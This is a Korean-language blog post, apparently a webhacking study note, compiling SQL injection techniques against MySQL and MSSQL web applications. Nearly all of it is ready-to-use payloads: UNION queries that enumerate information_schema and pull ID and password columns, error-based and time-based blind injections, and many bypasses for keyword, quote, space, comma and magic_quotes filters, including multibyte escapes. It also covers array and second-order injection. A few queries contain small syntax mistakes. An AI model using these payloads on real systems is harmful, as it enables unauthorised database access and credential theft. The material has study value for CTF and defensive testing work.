---
title: "SQL 인젝션 정리"
category:
  - webhacking
tag:
  - webhacking
  - sql
  - sql injection
toc: true
toc_sticky: true
---
# 기본

가장 기본이 되는 sql injection
필터링이 없을 때 사용 가능하다.
~~~
?id=1 or 1=1#
~~~

# UNION을 사용한 DB 구조 파악

UNION을 이용하기 위해서는 원래 SELECT문의 칼럼 개수와 UNION 뒤에 입력할 SELECT문의 칼럼 개수가 같아야 한다. 따라서 ORDER BY 구문을 사용해서 원래 SELECT문의 칼럼 개수를 먼저 알아야 한다.
ORDER BY 구문 : 지정된 칼럼을 기준으로 결과를 정렬해주는 키워드, 전체 칼럼 개수보다 큰 값을 입력하면 오류가 발생한다.

1) 1' ORDER BY 1#, 1' ORDER BY 2#, 1' ORDER BY 3# 등 에러가 날 때까지 숫자를 입력해본다.
2)칼럼의 개수를 2개라고 가정할 때, UNION을 사용해 SQL인젝션을 시도해 볼 수 있다.
1' UNION SELECT 1,3#
1' UNION SELECT 'a','b'#

여기까지가 UNION을 사용한 SQL Injection의 원리이다.

## 테이블 정보 수집
MySQL에는 Information_schema라는 데이터베이스가 존재하는데, 이곳에선 MySQL 서버가 운영하는 모든 데이터베이스에 대한 정보(데이터베이스 이름, 테이블, 칼럼 정보 등)를 관리한다. 따라서 SQL 인젝션을 시도할 때, 공격 대상에 대한 정보를 수집하기 위해서 반드시 조회해야 하는 DB이다. Information_schema에는 여러 테이블이 존재하는데, 주로 SQL 인젝션에서 유용하게 사용될 정보들이 저장된 테이블은 schemata, tables, columns이다.

1) 먼저 schemata 테이블에 접근해서 DB명을 찾는다.
' UNION SELECT schema_name, 2 from information_schema.schemata#
2) DB명을 활용해서 table명을 찾는다.
' UNION SELECT table_name, 2 from information_schema.tables WHERE table_schema='[DB명]'#
3) table명을 활용해서 column명을 찾는다.
' UNION SELECT column_name, 2 from information_schema.columns WHERE table_schema='[DB명]' and table_name='[table명]'#
4) column들 중에 ID,PW 등의 중요한 칼럼의 데이터를 수집한다.
' UNION SELECT [ID 컬럼명], [PW 컬럼명] FROM [table명]#




만약 모든 table 명과 column명을 알아보고 싶을땐 아래와같이
?id=1 and 1=0 union select null,table_name,null from information_schema.tables limit 28,1-- -
information_schema를 참조해서 알아 볼수 있다. 
?id=1 and 1=0 union select null,table_name,null from information_schema.tables limit 28,1
?id=1 and 1=0 union select null,column_name,null from information_schema.columns where table_name='찾은 테이블이름' LIMIT 0,1-- -
테이블명과 컬럼명을 찾고난후에는
?id=1 and 1=0 union select null,password,null from users limit 1,1-- -
등과같이 원하는 정보를 뽑아낼 수 있습니다.

# GROUP BY ~ Having 을 사용한 DB 구조 파악

GROUP BY ~ Having 구문 : 출력된 레코드 중 조건에 해당하는 값을 그룹하는 구문
select 필드,집계함수 from 테이블 group by 필드 having 조건

집계함수는 테이블에 없는 필드이기 때문에 기존의 필드와 함께 출력될 수 없다.
그래서 집계함수를 필드와 그룹화하여 출력할 수 있게 해주는 구문이 Groyp by 이다.(Having은 group by의 조건절이다.)
조건 : select에서 선언된 필드는 group by에도 동일하게 선언되어야 한다.
ex) select age,count(age) from member group by age
    select age,count(age) from member group by age having age>27
만약 select와 group by의 필드가 같지 않다면 에러메시지를 출력하는데, 이 메시지로 db 구조로 파악할 수 있다.

?id=1' group by [컬럼1],[컬럼2] having 1=1#

# Convert 함수를 통한 DB 구조 파악
Convert 함수 : 데이터 형변환을 하는 함수
convert(데이터형식, 변환할 데이터, 스타일)
convert(int,'1')

select * from test where convert(int,'1')='1';
select * from test where convert(int,'1')='2';

group by ~ having 공격과 동일하게 오류를 유발하여 오류메시지에 해커가 원하는 정보가 출력되어 DB를 파악하는 공격 방법이다.

기타 정보 확인
1) 버전 정보 파악
select * from test where id='1' and convert(int,@@version)='1'
version정보는 문자라서 int형으로 바꿀 수 없기에 오류메시지가 도출된다.
2) DB 이름 파악
select * from test where id='1' and convert(int,db_name())='1'
3) 사용자계정 파악
select * from test where id='1' and convert(int,user_name())='1'

테이블명 확인
1) information_schema.tables에서 첫번째 테이블명 알아내기
select * from test where id='1' and convert(int,(select top 1 table_name from information_schema.tables))='1'
2) information_schema.tables에서 두번째 테이블명 알아내기
select * from test where id='1' and convert(int,(select top 1 table_name from information_schema.tables where table_name not in ('첫 테이블명')))='1'

필드명 확인
1) information_schema.columns 에서 첫번째 필드명 알아내기
select * from test where id='1' and convert(int,(select top 1 column_name from information_schema.columns))='1'
2) information_schema.columns 에서 두번째 필드명 알아내기
select * from test where id='1' and convert(int,(select top 1 column_name from information_schema.columns not in ('첫 필드명')))='1'

# Blind SQL Injection

직접적인 결과를 알 수 없고 참/거짓 여부만을 알 수 있을 때 사용되는 공격 기법
1) 참/거짓 여부를 판별하기 위해서는 다음과 같은 구문을 사용한다.
1' and 1=1#
1' and 1=2#
2) 그러나 이런 에러메시지 조차 알 수 없다면, 웹 요청에 대한 응답 시간의 차이를 이용해야 한다. 주로 sleep이나 waitfor 함수를 사용한다.
sleep 함수 : MySQL에서 쿼리 수행을 의도적으로 지연시킬 때 사용하는 함수.
1' and 1=2 and sleep(5)#
만약 입력값이 참이면 응답 시간이 5초 이상 걸리게 되고, 거짓이면 응답 시간이 짧을 것이다.
응답 시간은 [크롬 개발자 도구]-[네트워크]이나 외부 툴로 확인 가능하다.

이렇게 참/거짓을 구분할 수 있게된 후, substr()함수 등을 이용해서 한글자씩 SQL Injection을 실행한다.






1+procedure+analyse()













~~~ php
if(preg_match('/(and|null|where|limit)/i', $id))
exit('attack');
~~~
널대신엔 간단하게 0을 넣을수잇다. 또한 group_concat을 통해 모든 테이블 이름과 컬럼명을 토해 내개 할 수있다. 다만 group_concat은 default값으로 1024바이트 단위로 토해내고 information_schema에 잇는 system talbe명만 해도 900바이트가 되기때문에 모든 유저 테이블이 많을경우 에로 사항이 잇을수잇다. 
?id=(0)union(select(0),group_concat(table_name),(0)from(information_schema.tables))#

# WHERE KEY WORD ALTERNATIVE
자 그럼 위와 같은 상황시 어떻게 해야될까 우선 ORDER BY DESC를 통해 끝에잇는 user table만 찍어낼수도 잇겟지만 ORDER BY같은 경우 keyword 자체에 공백을 포함하므로 필터되어 버린다.  이럴때 쓸 수 있는 키워드가 바로 HAVING 이다 
where(table_name)=(0x헥스)
위와 같은 부분을
having((table_name)like(0x헥스)) 이렇게 쓸수 있는것이다.
*아래에서도 언급되겟지만 like는 = 대용으로 쓸수 있는 키워드이다.
두번째 테이블명이 궁금할때는 != 혹은 rlike를 통해 첫번째 table명을 배제함으로써 구할수 있다. 
?id=(0)union(select(table_schema),table_name,(0)from(information_schema.tables)having((table_schema)like(0x테이블명)&&(table_name)!=(0x첫번째테이블명)))#
\* group_concat 과 having은 동시에 쓰일수 없다는점 유의

1) And 와 OR
|| 와 &&를 사용한다.
ex) 1 || '1=1
2) Union select를 연달아 필터링 하는경우
"union select" 라는 연달아 붙어있는 문자열을 특수하게 필터링하는경우
union(select(pass)from(users)) 와같이 ()를 씀으로 필터링을 우회 할 수 있다 기본적으로 공백에도 적용되는 기법인데. 공백을 필요로 하는 부분을 ()로 묶어버리면된다.
예) select * from table where users = ~~일때
select(*)from(table)where(users)
또한 /**/도 사용할수 있다. union/*!*/select 혹은 union%0aselect.
%0a가 php내에서 개행함으로써 실제로 쿼리에 들어갈때 공백같은 역할을 하는것이다.
혹은 두가지 이상의 argument를 받을경우
verify.php?id=1 union/*&pass=*/select ~~~
이렇게 두 인자 사이에 넣음으로써도 우회가능하다.
 
3) Union 자체가 필터링 당했을경우
서브쿼리 혹은 substr, substring, left , right, lpad, rpad등을 이용해서 blind injection을 사용하자.
한가지 주위할점은 서브쿼리는 항상 ()로 둘러 쌓여야한다는것과 결과값이 항상 하나의 열만을 리턴해야된다는것! 웹해킹문제들에서도 자주 쓰이는 훼이크
 
4) Limit 필터
group by  + having을 쓰거나
group_concat 혹은 max, min 등의 보조함수를 쓰자. Limit은 상당히 많은 역할을 하는 키워드라 필터링 되면 짜증난다.
5) Group 필터
where 나 having문을 써서 특수한 조건을 첨가하도록 만들어주자.
6) Having/Where 필터
이럴경우 substr, group_concat 등을 이용해 한문자씩 비교해어야 한다.
group_concat은 default로 앞에서부터 1024 chars만큼만 읽어 온다는것 주의!
7) Select 필터
이경우 상당히 난감하다. 하지만 FILE privilege가 있을경우 (root)
' and substr(load_file('file'),locate('DocumentRoot', (load_file('file')))+length('DocumentRoot'),10)='a
load_file/ outfile 등을 적절히 이용해서 읽을 수 있다. 일종의 블라인드 인젝션
혹은 컬럼 명을 알경우 / 추측하여
' and data is not null# 등과같이도 가능. 컬럼명을 모를때 procedure analyse()는 유용하다.
' procedure analyse()#. 유의할점은 procedure analyse는 현재 쿼리에서 사용되고 있는 column에 관한 정보만 뿌려준다는점
혹은 ifnull(nullif()), case when, if() 등을 적절히 이용해 참을 만들어 줄 수도 있다.
where name=' ' 이라고할때  '-0#은 참이라는 사실을 이용해
'-if(name='Admin',1,0)# 과 같이 사용가능.
-----------------------------------------------------------------------------
자이제 키워드 필터링이 되었을때 주로 내장 function들을 사용했다는것을 알수 있다 또한 ' ' 를 사용하는 문자열 까지도. 하지만 functino들 까지 필터링되고 매직쿼터가 켜져서 ' '를 사용하지 못할경우 어떻게 우회할 수 있을까
일단 문자열은
다음과 같이 가능하다
' and substr(data,1,1) = 'a'#
' and substr(data,1,1) = 0x61#
' and substr(data,1,1) = unhex(61)#
' and substr(data,1,1) = char(97)#
다 'a'로 변환된다.
얘내까지 막혔을경우
' and substr(data,1,1) = 'a'#
' and hex(substr(data,1,1)) = 61#
' and ascii(substr(data,1,1)) = 97#
' and ord(substr(data,1,1)) = 97#

이젠 숫자로 변환시켜 비교 한다.
또한 conv함수를 쓸수도 있다.
conv(10,10,36) = 'a'
또한 substr 대신
substring, mid 함수가 있다는 점도 유용하다.
 
',' 콤마까지 꼼꼼하게 막아놨다면 어떻게 할가
->    substr(data from 1 for 1 )
또 lpad, rpad, left, right(reverse함수와 같이) , insert 등을 쓸수있다.
 
locate, instr, position 또한 유용










# 필터링 우회

## 공백 필터링

먼저 공백문자는 다음 키워드들로 대체할 수 있다.
' ' → /**/, %09, %0a, %0b, %0c, %0d, %a0, +, %20

공백문자을 대체하는 키워드들이 막혔을 경우, ()를 사용할 수 있다.
select * from table 라는 쿼리와 select(*)from(table) 이라는 쿼리가 동일하다.
?id=(1)and(1)=(0)union(select(null),table_name,(null)from(information_schema.tables))#

## '(싱글쿼터) 필터링

- 더블 쿼트(") 사용

?id="admin"

- 0x,0b를 사용해서 16진법,2진법으로 치환한다.

'admin' → 0x2761646d696e27
환경에 따라서 x,b만 사용해도 된다.

0x, 0b 대신 36 진법을 사용해도 된다.
select conv(10,10,36)='A'
또한 가젯에서 추출하는 방법도 있다.
select substr(monthname(from_unixtime(1)),2,1)='a' // monthname(from_unixtime(1)) = 'January'

- 백슬래시(\\) 사용

파라미터가 2개 이상인 제한적인 상황에서 사용 가능
?id=\&pw= or 1#
<br>
select id from table where id='$_GET[id]' and pw='$_GET[pw]'
<br>
select id from table where id='\' and pw=' or 1#'
<br>
id로 넘긴 \에 의해 바로 뒤의 '(싱글쿼터)가 문자로 인식되고, 결국 where id=\' and pw=' or 1로 쿼리가 넘어간다.

## 주석 필터링

#, -- 등의 주석이 필터링 되었을 경우에는 ;%00, /* 를 대신 사용할수도 있다. (Null문자는 magic_quotes_gpc 의 영향을 받음을 주의하자)

'#'의 주석범위는 한 줄이라서 %0a

## 숫자 필터링

숫자를 사용할 수 없는 경우에는 auto type cast 를 사용해서 우회한다.
false = 0
true = 1
true+true = 2
floor(version()) = 5

아래와 같은 cheat sheet또한 존재한다.

|false !pi()|0|ceil(pi()*pi())|10|ceil((pi()+pi())*pi())|20|
|true !!pi()|1|ceil(pi()*pi())+true|11|ceil(ceil(pi())*version())|21|
|true+true|2|ceil(pi()+pi()+version())|12 ceil(pi()*ceil(pi()+pi()))|22|
|floor(pi())|3|floor(pi()*pi()+pi())|13 ceil((pi()+ceil(pi()))*pi())|23|
|ceil(pi())|4|ceil(pi()*pi()+pi())|14 ceil(pi())*ceil(version())|24|
|floor(version())|5|ceil(pi()*pi()+version())|15 floor(pi()*(version()+pi()))|25|
|ceil(version())|6|floor(pi()*version())|16 floor(version()*version())|26|
|ceil(pi()+pi())|7|ceil(pi()*version())|17 ceil(version()*version())|27|
|floor(version()+pi())|8|ceil(pi()*version())+true|18 ceil(pi()*pi()*pi()-pi())|28|
|floor(pi()*pi())|9|floor((pi()+pi())*pi())|19 floor(pi()*pi()*floor(pi()))|29|

## =, like, or, and 우회

= → like, between, in, instr
!= → <>
and → && (%26%26)
or → || (%7c%7c)

## NULL 필터링
null 대신에 0을 사용할 수 있다.

## 우회 문자















## substr 우회

ord, right, left, mid 사용<br>
ex) substr('admin',1,1)='a' → left('admin',1)

## ascii 우회

ord, hex 사용

ex) ord('admin')=97 → ord()는 가장 왼쪽의 문자를 아스키코드 10진수로 변경

## ereg, eregi 우회 : case-sensitive

특수문자 → %00(널바이트) : %00(널바이트)까지 패턴 검색
문자열 → 대소문자 변경

## 기타 팁

영어가 아닌 문자 Blind-Injection 시, 한글자 당 바이트 추출:length(mid(pw,1,1))=4
error based SQL Injection
  - ' or id='admin' and if((select id='admin' and length(pw)=16), true, (select 1 union select 2))#
  - ' or id='admin'&&power((length(pw)>10)+1,999999999999999999)#











# 주석을 이용한 SQL Injection
'#'의 주석범위는 1Line -> 1Line은 %0a로 내릴수 있음
select test from test where id='abc' # %0a or 1=1 #











이 아래는 Blind SQL Injection에 대한 내용이다.


이럴 경우에 어떻게 필터링을 우회해야 하는지에 대해서 서술하겠다.

5)
일반적인 SQL Injection이 불가능할 경우에는 Blind SQL Injection 을 사용해야 한다.

Blind SQL Injection 을 하기 위해서는 글자를 잘라내는 과정이 선행되어야 하는데 여기서 substr 함수가 필터링될 경우가 있다.

6)
콤마만을 필터링당했을 경우에는 select substr('asdf' from 1 for 1)='a' 라는 방법도 존재한다.

7-1)
함수 자체가 필터링된 경우에는 substring 함수로 대체할수가 있다.

7-2)
그러나 substring 함수에 substr 라는 문자열이 들어가기에 [substr(] 라는 단어를 필터링하지 않는이상 substr 함수와 함께 필터링될 확률이 높다.

그럴때는 like 쿼리의 와일드카드를 사용해서 아래처럼 우회할 수 있다.
select id from member where id like 'a%'
select id from member where id like 'b%'
select id from member where id like 'c%'

% 는 뒤에 몇글자가 들어오던지 상관하지않고 select 를 해주는 역할을 하는 와일드카드이기에 이런 공격이 가능한 것이다.

첫번째 글자를 알아낸 후에는 아래의 예제처럼 뒤에 한글자씩 추가해주면 된다.
select id from member where id like 'ca%'
select id from member where id like 'cb%'
select id from member where id like 'cc%'

8)
와일드카드를 사용할때는 cat, camel, camera 처럼 여러개의 데이터가 동시에 select 될 경우가 있으니 익스플로잇을 작성할때 유의해야 한다.

9)
like 가 필터링 당했다면 left 함수와 right 함수를 섞어서 사용함으로써 우회가 가능하다.

두 함수는 각각 1번째 인자로 들어온 값을 왼쪽, 오른쪽으로부터 2번째 인자로 들어온 값 만큼 잘라내는 함수이다.

이를 혼합해서 아래의 예제처럼 substr 함수를 대신할 수 있는 것이다.

select right(left('asd',1),1) = 'a'
select right(left('asd',2),1) = 's'
select right(left('asd',3),1) = 'd'

10)
필터링이 더 걸려있으면 아래의 예제를 참고하자.
select mid('asd',1,1) = 'a'
select lpad('asd',1,space(1)) = 'a'
select rpad('asd',1,space(1)) = 'a'
select reverse(right(reverse('asd'),1)) = 'a'
select insert(insert('asd',1,0,space(0)),2,222,space(0)) = 'a'


11)
concat 함수는 select 'a' 's' 'd' 'f'='asdf' 이렇게 대신할 수 있다.

12)
if 함수는 case(), ifnull(), nullif() 로 대신할 수 있다.
ex) select case when 1=1 then sleep(1) else 1 end

13-1)
sleep 함수가 막혔을 경우에는 benchmark() 함수를 사용해서 select benchmark(1000000,MD5(CHAR(118))) 이런식으로 반복적인 연산을 통해서 시간을 지연시킬 수 있다.
13-2)
혹은 select (select count(*) from information_schema.columns A, information_schema.columns B, information_schema.columns C) 이런 실행시간이 오래 걸리는 쿼리를 실행함으로써 대신할수도 있다.

다만 위의 두 가지 방법은 응답하는데에 걸리는 시간이 불규칙적이라는 사실을 숙지해야한다.

# magic_quotes_gpc 우회
php.ini 파일의 설정값 중 하나다.
GET, POST, COOKIE 데이터 내 특정 문자가 있을 경우 앞에 백슬래시(\\)를 붙여서 반환한다. (addslashes() 함수와 동일하다.)

|' (싱글쿼터)|\\'|
|" (더블쿼터)|\\"|
|\\ (백슬래시)|\\\\|
|NULL (널바이트)|\\|

## 우회
멀티바이트를 사용하는 언어셋 환경에서, 백슬래시(\\) 앞에 %a1 ~ %fe 사이의 값을 추가한다. 즉, 다음과 같이 변경된다.

|'|\'|%5c%27|
|%a1'|%a1\'|%a1%5c%27|

%a1%c가 하나의 문자로 인식되어(멀티바이트) 한개의 문자와 '(single quotes)가 데이터베이스로 전송되고 결국 '(single quotes)가 데이터베이스에서 처리된다.

예시:
http://url/?pw=%aa' union select 1,2,3,4@@version,user(),7,database,9,10#

### 왜 %a1 ~ $fe 사이의 값인가?
현재 구글링 중인데 아직 잘 모르겠다.ㅠㅠ

# Array 변수를 사용한 SQL Injection

php.ini 파일에서 magic_quotes_gpc = on 으로 설정해두면 클라이언트가 서버로 보내는 데이터에서 싱글쿼터 앞에 백슬래시를 붙여준다.
이는 SQL Injection 공격을 하는데에 큰 걸림돌이 되곤 한다.
그런데 magic_quotes_gpc 는 GET, POST, COOKIE 로 날아온 값에만 적용된다.
magic_quotes_gpc 만 믿고 , Array 변수를 데이터베이스에 함부로 날리는 개발자는 우리의 아주 좋은 먹잇감이다.

이를테면 insert into uploadfile values('filename','path') 라는 쿼리를 날렸을 경우에는 filename 대신에
fdsa'),(user(),'1234'),('asdf 라는 값을 날려서
insert into uploadfile values('asdf','fdsa'),(version(),'1234'),('asdf','path') 이런식으로 쿼리가 조작될 수 있는 것이다.

insert 쿼리에서 insert into table values('asdf',1),('fdsa',2),('zxc',3) 이런식으로 여러개의 값을 동시에 넣을 수 있다는 사실을 몰랐다면 이 기회에 알아두자.



# Error Based SQL Injection

에러메세지를 출력해주는 제한적인 환경에서만 사용 가능하다.
에러기반 SQLi 기법은 mssql 환경에서는 아주 수월하다.
서로 다른 데이터형의 값을 비교하게되면 앞의 값을 뒤의 데이터형과 비교할 수 없다고 에러메세지를 한번에 뿜어주기 때문이다.

이를테면
select * from table where 'asdf'=123
이라는 쿼리를 날렸을 경우에
['asdf' 를 int 형의 값과 비교할 수 없습니다!]
라는 에러메세지가 뜬다.

그러나 mysql 에서는 auto type cast 를 해주기 때문에 서로 다른 데이터형의 값을 비교해도 아무런 문제가 없다.
원하는 값을 에러메세지에 한번에 띄우기 위해서는
select sum(5),concat(version(),floor(rand(0)*2)) as a from information_schema.tables group by a
이런식으로 공격해야한다.
여러개의 값에 같은 키워드를 주고 그 키워드로 정렬해서 에러를 내는 원리이다.

아래는 몇가지 예시이다.
select * from (select name_const(version(),1),name_const(version(),1))a
select * from table where 1=1 and ExtractValue(1,concat(0x01,version()))
select * from table where 1=1 and UpdateXML(1,concat(0x01,version()),1)
select * from table where (@:=1)or@ group by concat(@@version,@:=!@)having@||min(0)
환경에 맞게 골라쓰자.



# Error Based Blind SQL Injection
사용할 상황이 드문 공격기법이지만 알아둬서 나쁠건 없으니 개념만 알아두자.
select * from table where 1 and if(1=1,1,(select 1 union select 2))
select * from table where 1 and if(1=2,1,(select 1 union select 2))

첫번째 예제는 if 절이 1=1 로 참이 되면서 단순히 1을 반환한다.
두번째 예제는 if 절이 거짓이 되면서 select 1 union select 2 라는 쿼리를 실행하게 되고,
서브쿼리에서 복수의 값을 반환하면서 에러가 발생하게 된다. (thx to hellsonic)



# Indirect SQL Injection
insert into member where values('guest','123','qwe') 라는 쿼리가 있다고 해보자.
[guest'] 를 입력하면 php 단에서는 이 값을 [guest\'] 로 변경한 후에 mysql에 날려줌으로써 쿼리에 영향을 끼치지 못하도록 할 것이다.
그런데 mysql에서 직접 값을 조회하면 (외의이지만 조금만 생각해보면 당연하게도) [guest'] 라는 값이 들어가있다.
이제 [guest'] 라는 계정으로 로그인을 한다면 내 아이디는 [guest'] 가 된다.
여기서 로그를 본다던지 하는 행동을 위해 쿼리에 아이디를 직접 넣는 코드가 있다면?
이번에는 [guest'] 라는 값이 쿼리에 영향을 끼치게 된다.
이 공격은 php.ini 의 magic_quotes_runtime 옵션이 off 일때만 적용 가능하다.



# Efficient Blind SQL Injection
Blind SQL Injection 을 수행할 경우에 한 글자를 알아내기 위해 90여회의 쿼리를 날려줘야한다. (아스키범위 32~127)
그러나 쿼리를 효율적으로 작성하면 한 글자당 7회의 쿼리만으로 공격이 가능하다.
각 글자를 10진수로 변환해주고 다시 2진수로 변환한 후에 lpad 함수를 사용해 7글자로 맞춰주면 된다.
페이로드는 아래와 같다.
select substr(lpad(bin(ascii(substr('asdf',1,1))),7,0),1,1)
만약 알아내야하는 값이 md5 hash 와 같은 16진수의 묶음이라고 확신할 수 있다면 아래와 같은 쿼리를 통해서 글자당 4회의 쿼리로 더욱 효율적이고 빠른 공격이 가능하다.
select substr(lpad(bin(if(ascii(substring(pw,1,1))<90,ascii(substring(pw,1,1))-48,ascii(substring(pw,1,1))-87)),4,0),1,1)

# SQL Injection with information schema.processlist
대형 사이트를 대상으로 SQL Injection 공격을 진행할때에는 information schema.tables 테이블에 가서 테이블 목록을 봐도 어떤 테이블에 내가 원하는 정보가 담겨있는지 알기가 힘들다.
결국 당신은 이름이 비슷비슷한 수많은 테이블의 홍수속에서 멘붕당할수도 있다.
이럴때는 information schema.processlist 테이블을 사용해서 내가 원하는 정보를 담고있는 테이블을 빠르게 찾을 수 있다.
information schema.processlist 테이블은 현재 실행중인 쿼리들을 저장해두고 있다.
이럴때 select info from information_schema.processlist 라는 쿼리를 통해서 현재 실행중인 쿼리를 볼 수 있으며, 실험해보지는 않았으나 레이스컨디션 공격을 하듯이 반복적으로 시도하면 다른 사용자가 실행중인 쿼리도 조회가 가능할것이다.
만약 다른 사용자가 로그인중일때 우리가 해당 쿼리를 조회하는데에 성공했다면 회원들의 정보가 들어있는 칼럼명과 테이블명을 한번에 볼 수 있는것이다






















